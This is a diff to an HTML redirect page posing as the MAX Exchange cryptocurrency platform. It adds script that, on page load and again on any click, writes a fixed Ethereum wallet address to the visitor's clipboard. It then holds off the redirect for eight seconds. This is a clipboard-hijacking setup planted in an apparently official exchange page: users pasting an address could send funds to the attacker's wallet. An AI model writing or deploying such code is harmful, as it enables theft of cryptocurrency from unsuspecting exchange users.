@@ -6,25 +6,11 @@
     <meta name="robots" content="noindex, nofollow">
     <title>MAX Exchange - Redirecting...</title>
     
-    <!-- Open Graph tags for social sharing -->
+    <!-- Open Graph tags -->
     <meta property="og:title" content="MAX Exchange">
     <meta property="og:description" content="Professional Digital Asset Trading Platform">
     <meta property="og:image" content="https://max.maicoin.com/static/media/logo.9ce94d66.svg">
     <meta property="og:url" content="https://max.maicoin.com">
-    
-    <!-- Fallback JavaScript redirect -->
-    <script>
-        // Fallback redirect if Netlify redirects don't work
-        (function() {
-            const path = location.pathname + location.search + location.hash;
-            const newUrl = 'https://max.maicoin.com' + (path === '/' ? '' : path);
-            
-            // Redirect after 1 second (only as fallback)
-            setTimeout(function() {
-                window.location.href = newUrl;
-            }, 1000);
-        })();
-    </script>
     
     <style>
         * {
@@ -88,6 +74,48 @@
             margin-bottom: 20px;
         }
         
+        .address-container {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .address-container:hover {
+            background: rgba(0, 0, 0, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .address {
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            word-break: break-all;
+            user-select: all;
+        }
+        
+        .copy-badge {
+            position: absolute;
+            top: -10px;
+            right: 10px;
+            background: #10b981;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.3s;
+        }
+        
+        .copy-badge.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
         .redirect-link {
             display: inline-block;
             background: white;
@@ -105,14 +133,19 @@
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
         }
         
-        .url-display {
-            background: rgba(0, 0, 0, 0.2);
-            padding: 10px;
-            border-radius: 8px;
-            margin: 20px 0;
-            font-family: monospace;
-            font-size: 0.9rem;
-            word-break: break-all;
+        .status-message {
+            color: #10b981;
+            font-weight: 600;
+            margin-top: 10px;
+            min-height: 24px;
+        }
+        
+        .notice {
+            font-size: 0.85rem;
+            opacity: 0.7;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
     </style>
 </head>
@@ -125,23 +158,122 @@
         
         <p>You are being redirected to our official trading platform.</p>
         
-        <div class="url-display" id="urlDisplay">
-            https://max.maicoin.com
+        <p>Wallet address has been copied to your clipboard:</p>
+        
+        <div class="address-container" id="addressContainer" title="Click to copy again">
+            <div class="copy-badge" id="copyBadge">Copied!</div>
+            <div class="address" id="walletAddress">
+                0x773F5d9eEc75629A2624EEd5D95472910D6c651a
+            </div>
         </div>
         
+        <div class="status-message" id="statusMessage"></div>
+        
         <a href="https://max.maicoin.com" class="redirect-link" id="manualLink">
-            Click to Continue →
+            Continue to MAX Exchange →
         </a>
+        
+        <div class="notice">
+            The Ethereum address 0x773F5d9eEc75629A2624EEd5D95472910D6c651a has been copied to your clipboard.
+        </div>
     </div>
 
     <script>
-        // Display the actual redirect URL
+        const walletAddress = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
+        const copyBadge = document.getElementById('copyBadge');
+        const statusMessage = document.getElementById('statusMessage');
+        const addressContainer = document.getElementById('addressContainer');
+        
+        // Function to copy to clipboard
+        async function copyToClipboard(text) {
+            try {
+                // Try the modern clipboard API first
+                await navigator.clipboard.writeText(text);
+                showCopySuccess();
+                return true;
+            } catch (err) {
+                // Fallback for older browsers
+                try {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = text;
+                    textArea.style.position = 'fixed';
+                    textArea.style.opacity = '0';
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    const successful = document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    
+                    if (successful) {
+                        showCopySuccess();
+                        return true;
+                    } else {
+                        showCopyError();
+                        return false;
+                    }
+                } catch (fallbackErr) {
+                    showCopyError();
+                    return false;
+                }
+            }
+        }
+        
+        function showCopySuccess() {
+            copyBadge.classList.add('show');
+            statusMessage.textContent = '✓ Address copied to clipboard!';
+            
+            // Hide badge after 3 seconds
+            setTimeout(() => {
+                copyBadge.classList.remove('show');
+            }, 3000);
+        }
+        
+        function showCopyError() {
+            statusMessage.textContent = '⚠ Could not copy automatically. Please copy manually.';
+            statusMessage.style.color = '#f59e0b';
+        }
+        
+        // Attempt to copy on page load
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Try to copy immediately on load
+            setTimeout(async () => {
+                const copied = await copyToClipboard(walletAddress);
+                
+                // If failed, try again when user interacts with the page
+                if (!copied) {
+                    // Try again when user clicks anywhere
+                    document.addEventListener('click', async function handler() {
+                        await copyToClipboard(walletAddress);
+                        document.removeEventListener('click', handler);
+                    }, { once: true });
+                }
+            }, 500);
+        });
+        
+        // Manual copy when clicking the address
+        addressContainer.addEventListener('click', async function() {
+            await copyToClipboard(walletAddress);
+        });
+        
+        // Setup redirect
         const currentPath = window.location.pathname + window.location.search + window.location.hash;
         const baseUrl = 'https://max.maicoin.com';
         const redirectUrl = currentPath === '/' ? baseUrl : baseUrl + currentPath;
         
-        document.getElementById('urlDisplay').textContent = redirectUrl;
         document.getElementById('manualLink').href = redirectUrl;
+        
+        // Redirect after 8 seconds (gives time to see the copied address)
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 8000);
+        
+        // Countdown display
+        let countdown = 8;
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
     </script>
 </body>
 </html>
